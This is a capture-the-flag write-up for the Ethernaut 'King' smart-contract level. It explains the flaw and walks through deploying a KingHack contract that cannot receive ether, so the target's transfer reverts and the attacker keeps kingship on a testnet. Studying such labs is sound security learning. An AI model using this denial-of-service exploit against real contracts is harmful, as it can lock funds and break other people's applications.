# 09 - King

## Challenge

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

## Summary

The contract has a `receive` function. Upon called, if the value we send is larger than the current `prize`, we will become the new `king` and `prize` is updated. However, when we submit the instance, the level will reclaim kingship, and since `msg.sender == owner` will be evaluated true (the `owner` cannot be changed), we will lose the kingship.

The goal here is to not let `receive` execute successfully so that we can keep the kingship. Key line is `payable(king).transfer(msg.value);`. Basically, when a new king is claimed, the contract will send new value to the old `king` address. If we can make the old `king` address not able to receive the value, we can keep the kingship because the call will be reverted. Therefore, we can write an attack contract that does not implement `receive` or `fallback` function. As a result, when the contract tries to send value to our contract, it will fail and the call will be reverted.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0xB30ab7E06dfAfF1a08B45fCb4f1690609741E108'
```

We first deploy a contract that has no `receive` or `fallback`:

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {
    function hack(address payable _to) external payable {
        (bool success, ) = _to.call{value: msg.value}("");
        require(success, "Call failed");
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['KingHack']
>>> 
>>> contract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> contract.deploy()
2023-06-13 22:58:57.517 | DEBUG    | cheb3.contract:deploy:94 - Deploying contract ...
2023-06-13 23:00:28.509 | INFO     | cheb3.contract:deploy:99 - The contract is deployed at 0x1bD76f0a04178cA59e0bDb11DD2Fcfea313ED369
```

Next, we know that

```js
> await contract.prize().then(v => v.toString())
'1000000000000000'
```

So at least 1000000000000000 wei is required to claim kingship. We now call `hack` with this value:

```py
>>> contract.functions.hack(contract_addr).send_transaction(value=1000000000000000)
2023-06-13 23:01:24.951 | INFO     | cheb3.contract:send_transaction:236 - (0x1bD76f0a04178cA59e0bDb11DD2Fcfea313ED369).hack transaction hash: 0x0bfd4bc0d3c2c3bc50bfd1519fa9d1748aa32cfa42f64a2aaac1fb38fe07f7f2
AttributeDict({'blockHash': HexBytes('0x7dcea88c6fb4ec3ec42a8e8a0601af394a5cc92bd66e366ebfddc66beb77e787'), 'blockNumber': 9175804, 'contractAddress': None, 'cumulativeGasUsed': 8058927, 'effectiveGasPrice': 18785058124, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 48347, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x1bD76f0a04178cA59e0bDb11DD2Fcfea313ED369', 'transactionHash': HexBytes('0x0bfd4bc0d3c2c3bc50bfd1519fa9d1748aa32cfa42f64a2aaac1fb38fe07f7f2'), 'transactionIndex': 41, 'type': 0})
```

Now,

```js
> await contract._king()
'0x1bD76f0a04178cA59e0bDb11DD2Fcfea313ED369'
```

Which matched our deployed contract address. And we expect that when we submit the instance, the level will try to reclaim kingship, but fail because `KingHack` cannot receive the value.

Finally, submit the instance to pass the level.